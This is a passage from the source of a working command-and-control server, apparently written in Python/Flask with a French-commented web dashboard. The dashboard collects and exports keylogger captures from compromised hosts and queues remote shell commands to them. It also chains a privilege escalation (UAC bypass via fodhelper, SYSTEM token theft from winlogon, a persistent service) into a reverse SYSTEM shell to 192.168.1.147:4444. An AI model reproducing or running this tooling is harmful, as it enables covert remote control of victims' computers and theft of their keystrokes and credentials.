                                shine.style.cssText = 'position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(45deg, transparent 30%, rgba(255, 255, 255, 0.1) 50%, transparent 70%); pointer-events: none;';
                                cleanedDiv.appendChild(shine);
                                
                                const cleanedLabel = document.createElement('div');
                                cleanedLabel.style.cssText = 'color: #00ff88; font-size: 12px; text-transform: uppercase; margin-bottom: 12px; letter-spacing: 2px; font-weight: 800; display: flex; align-items: center; gap: 8px; text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);';
                                cleanedLabel.innerHTML = '<span style="font-size: 16px;"></span> TEXTE DÉCHIFFRÉ';
                                cleanedDiv.appendChild(cleanedLabel);
                                
                                const cleanedText = document.createElement('div');
                                cleanedText.style.cssText = 'font-size: 16px; font-weight: 600; color: #ffffff; line-height: 1.8; white-space: pre-wrap; word-break: break-word; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5); position: relative; z-index: 1; font-family: "Courier New", monospace; letter-spacing: 0.5px;';
                                cleanedText.textContent = log.cleaned_text;
                                cleanedDiv.appendChild(cleanedText);
                                
                                content.appendChild(cleanedDiv);
                            }
                            
                            // Afficher RAW OUTPUT en dessous (petit et discret, collapsible)
                            const rawDiv = document.createElement('details');
                            rawDiv.style.cssText = 'background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; padding: 12px; font-size: 11px; color: var(--text-muted); cursor: pointer; transition: all 0.3s ease;';
                            rawDiv.onmouseenter = () => { rawDiv.style.background = 'rgba(0, 0, 0, 0.5)'; };
                            rawDiv.onmouseleave = () => { rawDiv.style.background = 'rgba(0, 0, 0, 0.3)'; };
                            
                            const rawSummary = document.createElement('summary');
                            rawSummary.style.cssText = 'color: rgba(255, 255, 255, 0.5); font-size: 10px; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1.5px; font-weight: 600; display: flex; align-items: center; gap: 6px; user-select: none;';
                            rawSummary.innerHTML = '<span style="font-size: 12px;">⚙</span> RAW KEYSTROKES (Debug)';
                            rawDiv.appendChild(rawSummary);
                            
                            const rawText = document.createElement('div');
                            rawText.style.cssText = 'color: rgba(255, 255, 255, 0.4); margin-top: 10px; white-space: pre-wrap; word-break: break-word; font-family: "Courier New", monospace; line-height: 1.6;';
                            
                            // Color-code special keys in raw output with unicode symbols
                            let formattedRaw = log.output;
                            formattedRaw = formattedRaw.split('[BACKSPACE]').join('<span style="color: #ff6b6b; font-weight: bold;">⌫</span>');
                            formattedRaw = formattedRaw.split('[DELETE]').join('<span style="color: #ff6b6b; font-weight: bold;">⌦</span>');
                            formattedRaw = formattedRaw.split('[ENTER]').join('<span style="color: #4ecdc4; font-weight: bold;">↵</span>');
                            formattedRaw = formattedRaw.split('[TAB]').join('<span style="color: #95e1d3; font-weight: bold;">⇥</span>');
                            formattedRaw = formattedRaw.split('[CAPSLOCK]').join('<span style="color: #ffd93d; font-weight: bold;">⇪</span>');
                            formattedRaw = formattedRaw.split('[SHIFT]').join('<span style="color: #a8e6cf; font-weight: bold;">⇧</span>');
                            formattedRaw = formattedRaw.split('[LEFT]').join('<span style="color: #6bcbef; font-weight: bold;">←</span>');
                            formattedRaw = formattedRaw.split('[RIGHT]').join('<span style="color: #6bcbef; font-weight: bold;">→</span>');
                            formattedRaw = formattedRaw.split('[UP]').join('<span style="color: #6bcbef; font-weight: bold;">↑</span>');
                            formattedRaw = formattedRaw.split('[DOWN]').join('<span style="color: #6bcbef; font-weight: bold;">↓</span>');
                            formattedRaw = formattedRaw.split('[SPACE]').join('<span style="color: #a8e6cf;">␣</span>');
                            
                            rawText.innerHTML = formattedRaw;
                            rawDiv.appendChild(rawText);
                            content.appendChild(rawDiv);
                            
                            logBox.appendChild(content);
                            container.appendChild(logBox);
                        });
                    });
                })
                .catch(err => {
                    console.error('[JS] loadKeylogs() failed:', err);
                });
        }
        
        function exportKeylogs() {
            fetch('/api/keylogs')
                .then(r => r.json())
                .then(keylogs => {
                    let text = '=== KEYLOGGER EXPORT ===\\n';
                    text += 'Generated: ' + new Date().toLocaleString() + '\\n\\n';
                    
                    keylogs.forEach(k => {
                        text += '===================================\\n';
                        text += 'Agent: ' + k.hostname + ' (' + k.ip_address + ')\\n';
                        text += 'Time: ' + new Date(k.received_at).toLocaleString() + '\\n';
                        text += '-----------------------------------\\n';
                        text += k.output + '\\n\\n';
                    });
                    
                    // Download as file
                    const blob = new Blob([text], {type: 'text/plain'});
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'keylogs_' + Date.now() + '.txt';
                    a.click();
                    URL.revokeObjectURL(url);
                    
                    alert('✓ Keylogger data exported to file');
                })
                .catch(err => alert('✗ Export failed: ' + err));
        }
        
        function sendCommand() {
            const agent = document.getElementById('agent-select').value;
            const cmd = document.getElementById('command-select').value;
            const arg = document.getElementById('command-arg').value;
            
            if (!agent || !cmd) {
                alert('[ERROR] Please select agent and command');
                return;
            }
            
            const command = arg ? cmd + arg : cmd;
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({agent_id: agent, command: command})
            })
            .then(r => r.json())
            .then(data => {
                alert('[OK] Command queued: ' + command);
                document.getElementById('command-arg').value = '';
            })
            .catch(err => alert('[ERROR] ' + err));
        }
        
        // Shell Functions
        function openShell(agent) {
            currentShellAgent = agent;
            showView('agents');
            
            const shellPanel = document.getElementById('shell-panel');
            shellPanel.classList.add('active');
            
            document.getElementById('shell-agent-id').textContent = 'Agent: ' + agent.agent_id.substring(0, 12);
            document.getElementById('shell-agent-details').textContent = agent.hostname + ' \\\\ ' + agent.username + ' [' + agent.ip_address + ']';
            
            const output = document.getElementById('shell-output');
            output.innerHTML = '';
            
            // Initialiser le dernier ID de résultat pour éviter de charger tout l'historique
            fetch('/api/results')
                .then(r => r.json())
                .then(results => {
                    if (results.length > 0) {
                        shellLastResultId = Math.max(...results.map(r => r.id));
                    }
                    // Démarrer le polling APRÈS l'initialisation
                    startShellPolling();
                });
            
            document.getElementById('shell-input').focus();
        }
        
        function closeShell() {
            document.getElementById('shell-panel').classList.remove('active');
            currentShellAgent = null;
            stopShellPolling();
        }
        
        function handleShellEnter(event) {
            if (event.key === 'Enter') {
                sendShellCommand();
            } else if (event.key === 'ArrowUp') {
                event.preventDefault();
                if (shellHistoryIndex < shellHistory.length - 1) {
                    shellHistoryIndex++;
                    document.getElementById('shell-input').value = shellHistory[shellHistoryIndex];
                }
            } else if (event.key === 'ArrowDown') {
                event.preventDefault();
                if (shellHistoryIndex > 0) {
                    shellHistoryIndex--;
                    document.getElementById('shell-input').value = shellHistory[shellHistoryIndex];
                } else if (shellHistoryIndex === 0) {
                    shellHistoryIndex = -1;
                    document.getElementById('shell-input').value = '';
                }
            }
        }
        
        function sendShellCommand() {
            if (!currentShellAgent) return;
            
            const input = document.getElementById('shell-input');
            const command = input.value.trim();
            
            if (!command) return;
            
            shellHistory.unshift(command);
            shellHistoryIndex = -1;
            
            const output = document.getElementById('shell-output');
            const line = document.createElement('div');
            line.className = 'shell-line';
            
            const promptSpan = document.createElement('span');
            promptSpan.className = 'shell-prompt';
            promptSpan.textContent = currentShellAgent.hostname + '>';
            
            const cmdSpan = document.createElement('span');
            cmdSpan.className = 'shell-command';
            cmdSpan.textContent = command;
            
            line.appendChild(promptSpan);
            line.appendChild(cmdSpan);
            output.appendChild(line);
            
            const loadingLine = document.createElement('div');
            loadingLine.className = 'shell-line';
            const loadingSpan = document.createElement('span');
            loadingSpan.style.color = 'var(--text-muted)';
            loadingSpan.textContent = '[ Executing... ]';
            loadingLine.appendChild(loadingSpan);
            output.appendChild(loadingLine);
            
            output.scrollTop = output.scrollHeight;
            input.value = '';
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    agent_id: currentShellAgent.agent_id,
                    command: 'shell|' + command
                })
            })
            .then(r => r.json())
            .then(() => {
                loadingLine.innerHTML = '<span style="color: var(--accent-primary);">[ Command queued ]</span>';
                setTimeout(() => checkShellResults(), 2000);
            })
            .catch(err => {
                const errSpan = document.createElement('span');
                errSpan.className = 'shell-error';
                errSpan.textContent = '[ Error: ' + err + ' ]';
                loadingLine.innerHTML = '';
                loadingLine.appendChild(errSpan);
            });
        }
        
        let shellPollingInterval = null;
        
        function startShellPolling() {
            if (shellPollingInterval) clearInterval(shellPollingInterval);
            shellPollingInterval = setInterval(checkShellResults, 3000);
        }
        
        function stopShellPolling() {
            if (shellPollingInterval) {
                clearInterval(shellPollingInterval);
                shellPollingInterval = null;
            }
        }
        
        let shellLastResultId = 0;
        
        function checkShellResults() {
            if (!currentShellAgent) return;
            
            fetch('/api/results')
                .then(r => r.json())
                .then(results => {
                    const agentResults = results.filter(r => 
                        r.agent_id === currentShellAgent.agent_id && 
                        r.id > shellLastResultId
                    );
                    
                    if (agentResults.length > 0) {
                        const output = document.getElementById('shell-output');
                        
                        // Track outputs par CONTENU pour éviter duplicatas (l'agent envoie 3x le même résultat)
                        const displayedOutputs = new Set(
                            Array.from(output.children)
                                .map(el => el.textContent.trim())
                                .filter(txt => txt && !txt.includes('[ Executing'))
                        );
                        
                        agentResults.forEach(result => {
                            if (result.id > shellLastResultId) shellLastResultId = result.id;
                            
                            // Parse format spécial du shell: SHELL|output\\nE
                            let displayOutput = result.output;
                            if (displayOutput.startsWith('SHELL|')) {
                                displayOutput = displayOutput.substring(6); // Enlève "SHELL|"
                                displayOutput = displayOutput.replace(/\\\\nE\\\\s*$/, '').trim(); // Enlève "\\nE" final
                            }
                            
                            // Si c'est un keylog, ne pas l'afficher dans le shell (redirect vers Keylogger tab)
                            if (result.command && result.command.startsWith('keylog_')) {
                                return; // Skip keylogs dans le shell
                            }
                            
                            // Skip duplicatas par contenu
                            if (displayedOutputs.has(displayOutput.trim())) return;
                            displayedOutputs.add(displayOutput.trim());
                            
                            const existingLoading = Array.from(output.children).find(
                                el => el.textContent.includes('[ Executing... ]') || el.textContent.includes('[ Command queued ]')
                            );
                            if (existingLoading) existingLoading.remove();
                            
                            const resultLine = document.createElement('div');
                            resultLine.className = 'shell-line';
                            
                            const isError = result.status !== 'OK';
                            const resultClass = isError ? 'shell-error' : 'shell-result';
                            
                            const resultDiv = document.createElement('div');
                            resultDiv.className = resultClass;
                            resultDiv.textContent = displayOutput;
                            resultLine.appendChild(resultDiv);
                            output.appendChild(resultLine);
                        });
                        
                        output.scrollTop = output.scrollHeight;
                    }
                });
        }
        
        // ============ SYSTEM SHELL FUNCTIONS ============
        
        let currentSystemShellAgent = null;
        let systemShellPollingInterval = null;
        let systemShellHistory = [];
        let systemShellHistoryIndex = -1;
        
        function openSystemShell(agent) {
            currentSystemShellAgent = agent;
            
            // RÉINITIALISER complètement le shell (nouveau shell sans historique)
            systemShellHistory = [];
            systemShellHistoryIndex = -1;
            
            const panel = document.getElementById('shell-system-panel');
            panel.classList.add('active');
            
            const agentDetails = document.getElementById('shell-system-agent-details');
            agentDetails.textContent = agent.hostname + ' (' + agent.ip_address + ') - ' + agent.username;
            
            const output = document.getElementById('shell-system-output');
            output.innerHTML = '';
            
            // Line 1: Status
            const sysLine4 = document.createElement('div');
            sysLine4.className = 'shell-line';
            const sysSpan4 = document.createElement('span');
            sysSpan4.style.color = 'var(--text-muted)';
            sysSpan4.textContent = '[0/3] Stopping existing shell...';
            sysLine4.appendChild(sysSpan4);
            output.appendChild(sysLine4);
            
            // ÉTAPE 0: Arrêter le shell existant d'abord
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    agent_id: agent.agent_id,
                    command: 'revshell_stop'
                })
            }).then(() => {
                // Attendre 500ms que le shell se ferme
                setTimeout(() => {
                    // Réinitialiser l'ID tracker APRÈS l'arrêt du shell
                    systemShellLastResultId = 0;
                    
                    // Récupérer le dernier ID de résultat pour partir sur une base propre
                    fetch('/api/results')
                        .then(r => r.json())
                        .then(results => {
                            if (results.length > 0) {
                                systemShellLastResultId = Math.max(...results.map(r => r.id));
                            }
                            
                            const elevLine = document.createElement('div');
                            elevLine.className = 'shell-line';
                            const elevSpan = document.createElement('span');
                            elevSpan.style.color = 'var(--text-muted)';
                            elevSpan.textContent = '[1/3] Elevating to SYSTEM privileges...';
                            elevLine.appendChild(elevSpan);
                            output.appendChild(elevLine);
                            
                            // ÉTAPE 1: Élévation de privilèges (Token Stealing)
                            fetch('/api/command', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    agent_id: agent.agent_id,
                                    command: 'privesc'
                                })
                            }).then(() => {
                // Attendre le résultat de privesc
                let checks = 0;
                const checkPrivesc = setInterval(() => {
                    fetch('/api/results')
                        .then(r => r.json())
                        .then(results => {
                            const privescResult = results.find(r => 
                                r.agent_id === agent.agent_id && 
                                r.command === 'privesc' &&
                                r.id > systemShellLastResultId
                            );
                            
                            if (privescResult) {
                                clearInterval(checkPrivesc);
                                systemShellLastResultId = privescResult.id;
                                
                                const output = document.getElementById('shell-system-output');
                                const line = document.createElement('div');
                                line.className = 'shell-line';
                                
                                if (privescResult.status === 'OK' || privescResult.output.includes('SUCCESS')) {
                                    const successSpan = document.createElement('span');
                                    successSpan.style.color = '#00ff00';
                                    successSpan.textContent = '✓ ' + privescResult.output;
                                    line.appendChild(successSpan);
                                    output.appendChild(line);
                                    
                                    // ÉTAPE 2: Démarrer le shell interactif
                                    const startLine = document.createElement('div');
                                    startLine.className = 'shell-line';
                                    const startSpan = document.createElement('span');
                                    startSpan.style.color = 'var(--text-muted)';
                                    startSpan.textContent = '[2/3] Starting interactive shell...';
                                    startLine.appendChild(startSpan);
                                    output.appendChild(startLine);
                                    output.scrollTop = output.scrollHeight;
                                    
                                    // Lancer revshell_system (TCP reverse shell avec token SYSTEM)
                                    fetch('/api/command', {
                                        method: 'POST',
                                        headers: {'Content-Type': 'application/json'},
                                        body: JSON.stringify({
                                            agent_id: agent.agent_id,
                                            command: 'revshell_system',
                                            args: '192.168.1.147:4444'
                                        })
                                    }).then(() => {
                                        let shellChecks = 0;
                                        const checkShellStart = setInterval(() => {
                                            fetch('/api/results')
                                                .then(r => r.json())
                                                .then(results => {
                                                    const shellResult = results.find(r => 
                                                        r.agent_id === agent.agent_id && 
                                                        r.command === 'revshell_system' &&
                                                        r.id > systemShellLastResultId
                                                    );
                                                    
                                                    if (shellResult) {
                                                        clearInterval(checkShellStart);
                                                        systemShellLastResultId = shellResult.id;
                                                        
                                                        const shellLine = document.createElement('div');
                                                        shellLine.className = 'shell-line';
                                                        
                                                        if (shellResult.status === 'OK' || shellResult.output.includes('SUCCESS')) {
                                                            const shellSuccessSpan = document.createElement('span');
                                                            shellSuccessSpan.style.color = '#00ff00';
                                                            shellSuccessSpan.textContent = '✓ ' + shellResult.output;
                                                            shellLine.appendChild(shellSuccessSpan);
                                                            
                                                            const readyLine = document.createElement('div');
                                                            readyLine.className = 'shell-line';
                                                            const readySpan = document.createElement('span');
                                                            readySpan.style.color = 'var(--text-muted)';
                                                            readySpan.textContent = '[3/3] Shell ready';
                                                            readyLine.appendChild(readySpan);
                                                            output.appendChild(readyLine);
                                                            
                                                            const finalLine = document.createElement('div');
                                                            finalLine.className = 'shell-line';
                                                            const finalSpan = document.createElement('span');
                                                            finalSpan.style.color = '#00ff00';
                                                            finalSpan.style.fontWeight = '700';
                                                            finalSpan.textContent = '[ SYSTEM SHELL READY ]';
                                                            finalLine.appendChild(finalSpan);
                                                            output.appendChild(shellLine);
                                                            output.appendChild(readyLine);
                                                            output.appendChild(finalLine);
                                                        } else {
                                                            const shellErrorSpan = document.createElement('span');
                                                            shellErrorSpan.style.color = '#ff0000';
                                                            shellErrorSpan.textContent = '✗ ' + shellResult.output;
                                                            shellLine.appendChild(shellErrorSpan);
                                                            output.appendChild(shellLine);
                                                        }
                                                        
                                                        output.scrollTop = output.scrollHeight;
                                                        document.getElementById('shell-system-input').focus();
                                                    } else if (++shellChecks > 120) {
                                                        clearInterval(checkShellStart);
                                                        const errLine = document.createElement('div');
                                                        errLine.className = 'shell-line';
                                                        const errSpan = document.createElement('span');
                                                        errSpan.style.color = '#ff0000';
                                                        errSpan.textContent = '✗ Shell start timeout (60s)';
                                                        errLine.appendChild(errSpan);
                                                        output.appendChild(errLine);
                                                    }
                                                });
                                        }, 500);
                                    });
                                    
                                } else {
                                    const errorSpan = document.createElement('span');
                                    errorSpan.style.color = '#ff0000';
                                    errorSpan.textContent = '✗ Privilege escalation failed: ' + privescResult.output;
                                    line.appendChild(errorSpan);
                                    output.appendChild(line);
                                    output.scrollTop = output.scrollHeight;
                                }
                                
                            } else if (++checks > 120) {
                                clearInterval(checkPrivesc);
                                const errLine = document.createElement('div');
                                errLine.className = 'shell-line';
                                const timeoutSpan = document.createElement('span');
                                timeoutSpan.style.color = '#ff0000';
                                timeoutSpan.textContent = '✗ Privilege escalation timeout (60s)';
                                errLine.appendChild(timeoutSpan);
                                output.appendChild(errLine);
                            }
                        });
                }, 500);
            });
                        });
                }, 500); // Attendre que le shell se ferme
            });
        }
        
        function closeSystemShell() {
            document.getElementById('shell-system-panel').classList.remove('active');
            currentSystemShellAgent = null;
            stopSystemShellPolling();
        }
        
        function handleSystemShellEnter(event) {
            if (event.key === 'Enter') {
                sendSystemShellCommand();
            } else if (event.key === 'ArrowUp') {
                event.preventDefault();
                if (systemShellHistoryIndex < systemShellHistory.length - 1) {
                    systemShellHistoryIndex++;
                    document.getElementById('shell-system-input').value = systemShellHistory[systemShellHistoryIndex];
                }
            } else if (event.key === 'ArrowDown') {
                event.preventDefault();
                if (systemShellHistoryIndex > 0) {
                    systemShellHistoryIndex--;
                    document.getElementById('shell-system-input').value = systemShellHistory[systemShellHistoryIndex];
                } else if (systemShellHistoryIndex === 0) {
                    systemShellHistoryIndex = -1;
                    document.getElementById('shell-system-input').value = '';
                }
            }
        }
        
        function sendSystemShellCommand() {
            if (!currentSystemShellAgent) return;
            
            const input = document.getElementById('shell-system-input');
            const command = input.value.trim();
            
            if (!command) return;
            
            systemShellHistory.unshift(command);
            systemShellHistoryIndex = -1;
            
            const output = document.getElementById('shell-system-output');
            const line = document.createElement('div');
            line.className = 'shell-line';
            
            const sysPromptSpan = document.createElement('span');
            sysPromptSpan.className = 'shell-prompt';
            sysPromptSpan.style.color = '#ff0000';
            sysPromptSpan.textContent = 'SYSTEM>';
            
            const sysCmdSpan = document.createElement('span');
            sysCmdSpan.className = 'shell-command';
            sysCmdSpan.textContent = command;
            
            line.appendChild(sysPromptSpan);
            line.appendChild(sysCmdSpan);
            output.appendChild(line);
            
            // Afficher indicateur de chargement
            const loadingLine = document.createElement('div');
            loadingLine.className = 'shell-line shell-loading';
            const sysLoadingSpan = document.createElement('span');
            sysLoadingSpan.style.color = 'var(--text-muted)';
            sysLoadingSpan.textContent = '[ Executing... ]';
            loadingLine.appendChild(sysLoadingSpan);
            output.appendChild(loadingLine);
            
            output.scrollTop = output.scrollHeight;
            input.value = '';
            
            // Capturer l'ID actuel AVANT d'envoyer
            const currentLastId = systemShellLastResultId;
            
            // Envoyer la commande
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    agent_id: currentSystemShellAgent.agent_id,
                    command: 'revshell_input|' + command
                })
            })
            .then(() => {
                // Créer un Set pour tracker les contenus déjà affichés
                const displayedOutputs = new Set(
                    Array.from(output.children)
                        .filter(el => el.className === 'shell-line shell-result')
                        .map(el => el.textContent.trim())
                        .filter(txt => txt)
                );
                
                // Polling simple: attendre LE PROCHAIN résultat unique
                let checks = 0;
                const checkInterval = setInterval(() => {
                    fetch('/api/results')
                        .then(r => r.json())
                        .then(results => {
                            // Chercher LE PROCHAIN résultat (premier avec id > currentLastId)
                            const nextResult = results
                                .filter(r => 
                                    r.agent_id === currentSystemShellAgent.agent_id && 
                                    r.command === 'revshell_input' &&
                                    r.id > currentLastId
                                )
                                .sort((a, b) => a.id - b.id)[0];
                                
                                if (nextResult) {
                                    // Vérifier si ce contenu est déjà affiché (détection duplicatas)
                                    const outputText = nextResult.output.trim();
                                    if (displayedOutputs.has(outputText)) {
                                        // C'est un duplicata, mettre à jour l'ID et continuer
                                        systemShellLastResultId = nextResult.id;
                                        return;
                                    }
                                    
                                    clearInterval(checkInterval);
                                    
                                    // Retirer le loading
                                    if (loadingLine.parentNode) {
                                        loadingLine.remove();
                                    }
                                    
                                    // Afficher le résultat
                                    const resultLine = document.createElement('div');
                                    resultLine.className = 'shell-line shell-result';
                                    resultLine.style.whiteSpace = 'pre-wrap';
                                    resultLine.textContent = nextResult.output;
                                    output.appendChild(resultLine);
                                    output.scrollTop = output.scrollHeight;
                                    
                                    // Mettre à jour au résultat affiché
                                    systemShellLastResultId = nextResult.id;
                                    displayedOutputs.add(outputText);
                                    
                                    // Focus sur l'input
                                    input.focus();
                                } else if (++checks > 120) {
                                    // Timeout après 60s
                                    clearInterval(checkInterval);
                                    if (loadingLine.parentNode) {
                                        loadingLine.innerHTML = '<span style="color: #ff0000;">[ Timeout ]</span>';
                                    }
                                }
                            })
                            .catch(err => {
                                clearInterval(checkInterval);
                                if (loadingLine.parentNode) {
                                    const errSpan2 = document.createElement('span');
                                    errSpan2.style.color = '#ff0000';
                                    errSpan2.textContent = '[ Error: ' + err + ' ]';
                                    loadingLine.innerHTML = '';
                                    loadingLine.appendChild(errSpan2);
                                }
                            });
                }, 500);
            })
            .catch(err => {
                if (loadingLine.parentNode) {
                    const finalErrSpan = document.createElement('span');
                    finalErrSpan.style.color = '#ff0000';
                    finalErrSpan.textContent = '[ Error: ' + err + ' ]';
                    loadingLine.innerHTML = '';
                    loadingLine.appendChild(finalErrSpan);
                }
                console.error('Error sending SYSTEM command:', err);
            });
        }
        
        function startSystemShellPolling() {
            // Polling désactivé - résultats récupérés directement après chaque commande
            stopSystemShellPolling();
        }
        
        function stopSystemShellPolling() {
            if (systemShellPollingInterval) {
                clearInterval(systemShellPollingInterval);
                systemShellPollingInterval = null;
            }
        }
        
        let systemShellLastResultId = 0; // Tracker le dernier résultat affiché
        
        function checkSystemShellResults() {
            // Cette fonction n'est plus utilisée
            // Les résultats sont maintenant récupérés directement dans sendSystemShellCommand()
        }
        
        // Modifier sendCommand pour ouvrir le shell SYSTEM quand privesc est exécuté
        const originalSendCommand = sendCommand;
        function sendCommand() {
            const cmd = document.getElementById('command-select').value;
            const agent_id = document.getElementById('agent-select').value;
            const arg = document.getElementById('command-arg').value;
            
            if (!agent_id || !cmd) {
                alert('[ERROR] Please select agent and command');
                return;
            }
            
            // Confirmation pour privesc
            if (cmd === 'privesc') {
                const confirmMsg = 'PRIVILEGE ESCALATION\\n\\n' +
                                 'This will:\\n' +
                                 '1. Download PrivEsc_C2.exe to target\\n' +
                                 '2. Bypass UAC via fodhelper\\n' +
                                 '3. Steal SYSTEM token from winlogon\\n' +
                                 '4. Create persistent Windows service\\n' +
                                 '5. Open reverse SYSTEM shell\\n\\n' +
                                 'Proceed?';
                
                if (!confirm(confirmMsg)) {
                    return;
                }
                
                // Notification visuelle
                const executeBtn = document.getElementById('execute-btn');
                executeBtn.textContent = '⏳ ESCALATING...';
                executeBtn.disabled = true;
            }
            
            const command = arg ? cmd + arg : cmd;
            
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({agent_id: agent_id, command: command})
            })
            .then(r => r.json())
            .then(data => {
                if (cmd === 'privesc') {
                    // Notification
                    alert('[SUCCESS] Privilege escalation initiated\\nWait 5-10 seconds for SYSTEM shell...');
                    
                    // Ouvrir le shell SYSTEM après 3 secondes
                    fetch('/api/agents')
                        .then(r => r.json())
                        .then(agents => {
                            const agent = agents.find(a => a.agent_id === agent_id);
                            if (agent) {
                                setTimeout(() => {
                                    openSystemShell(agent);
                                    // Réinitialiser le bouton
                                    const executeBtn = document.getElementById('execute-btn');
                                    executeBtn.textContent = '⚠️ ELEVATE TO SYSTEM';
                                    executeBtn.disabled = false;
                                }, 3000);
                            }
                        });
                } else {
                    alert('[OK] Command queued: ' + command);
                }
                
                document.getElementById('command-arg').value = '';
            })
            .catch(err => {
                alert('[ERROR] ' + err);
                // Réinitialiser le bouton en cas d'erreur
                if (cmd === 'privesc') {
                    const executeBtn = document.getElementById('execute-btn');
                    executeBtn.textContent = '⚠️ ELEVATE TO SYSTEM';
                    executeBtn.disabled = false;
                }
            });
        }
        
        // Initialize on DOM ready
        document.addEventListener('DOMContentLoaded', function() {
            console.log('========================================');
            console.log('[JS] DOMContentLoaded EVENT FIRED');
            console.log('[JS] Browser:', navigator.userAgent);
            console.log('[JS] Current URL:', window.location.href);
            console.log('========================================');
            
            // Debug: Check all tables on page
            console.log('[JS] DEBUG: All tables:', document.querySelectorAll('table'));
            console.log('[JS] DEBUG: Table by ID:', document.getElementById('agents-table'));
            console.log('[JS] DEBUG: All tbody:', document.querySelectorAll('tbody'));
            
            // Command dropdown listener - Simplified
            const commandSelect = document.getElementById('command-select');
            console.log('[JS] Command select element:', commandSelect);
            if (commandSelect) {
                commandSelect.addEventListener('change', function() {
                    const executeBtn = document.getElementById('execute-btn');
                    const selectedCmd = this.value;
                    
                    // Change button style for privesc
                    if (selectedCmd === 'privesc') {
                        executeBtn.classList.add('privesc-active');
                    } else {
                        executeBtn.classList.remove('privesc-active');
                    }
                });
            }
            
            // Charger immédiatement les données
            console.log('========================================');
            console.log('[JS] LOADING INITIAL DATA');
            console.log('========================================');
            loadAgents();
            loadResults();
            loadKeylogs();
            
            // Auto-refresh toutes les 5 secondes
            console.log('[JS] Setting up auto-refresh timers (5s interval)');
            const agentInterval = setInterval(loadAgents, 5000);
            const resultsInterval = setInterval(loadResults, 5000);
            const keylogInterval = setInterval(loadKeylogs, 5000);
            console.log('[JS] Agent interval ID:', agentInterval);
            console.log('[JS] Results interval ID:', resultsInterval);
            console.log('[JS] Keylog interval ID:', keylogInterval);
        });
        
        // Update right sidebar stats
        function updateRightSidebar() {
            fetch('/api/agents')
                .then(r => r.json())
                .then(agents => {
                    const now = new Date();
                    const online = agents.filter(a => {
                        const lastSeen = new Date(a.last_seen);
                        return (now - lastSeen) / 60000 < 2.5;
                    });
                    
                    document.getElementById('rs-online').textContent = online.length;
                    document.getElementById('rs-offline').textContent = agents.length - online.length;
                    document.getElementById('rs-total').textContent = agents.length;
                });
            
            fetch('/api/results')
                .then(r => r.json())
                .then(results => {
                    document.getElementById('rs-results').textContent = results.length;
                    
                    // Last 5 activities
                    const activities = results.slice(0, 5);
                    const container = document.getElementById('rs-activities');
                    container.innerHTML = '';
                    
                    activities.forEach(r => {
                        const item = document.createElement('div');
                        item.className = 'activity-item';
                        if (r.status !== 'OK') item.classList.add('danger');
                        else if (r.command.includes('privesc')) item.classList.add('success');
                        
                        const text = document.createElement('div');
                        text.className = 'activity-text';
                        text.textContent = r.command.substring(0, 40);
                        
                        const time = document.createElement('div');
                        time.className = 'activity-time';
                        time.textContent = new Date(r.received_at).toLocaleTimeString();
                        
                        item.appendChild(text);
                        item.appendChild(time);
                        container.appendChild(item);
                    });
                });
        }
        
    </script>
</body>
</html>
"""

@app.route('/')
def dashboard():
    """Afficher le dashboard web."""
    from flask import make_response
    response = make_response(render_template_string(HTML_TEMPLATE))
    response.headers['Content-Type'] = 'text/html; charset=utf-8'
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

if __name__ == '__main__':
    print("[*] Initialisation C2 Server...")
    init_db()
    print(f"[+] Database created: {DB_PATH}")
    
    if not os.path.exists('cert.pem') or not os.path.exists('key.pem'):
        print("[*] Génération certificat SSL auto-signé...")
        os.system('openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"')
    
    shell_listener_thread = threading.Thread(target=start_shell_listener, daemon=True)
    shell_listener_thread.start()
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('cert.pem', 'key.pem')
    
    print(f"\n[+] C2 Server running on https://{HOST}:{PORT}")
    print(f"[+] Dashboard: https://127.0.0.1:{PORT}")
    
    if os.path.exists('c2_config.txt'):
        print("\n[*] URLs C2 configurees:")
        with open('c2_config.txt', 'r') as f:
            for i, line in enumerate(f, 1):
                url = line.strip()
                if url:
                    print(f"    {i}. {url}")
    
    print(f"\n[+] Shell Listener: tcp://{HOST}:{SHELL_PORT}")
    print(f"[!] Press CTRL+C to stop\n")
    
    app.run(host=HOST, port=PORT, ssl_context=context, debug=False)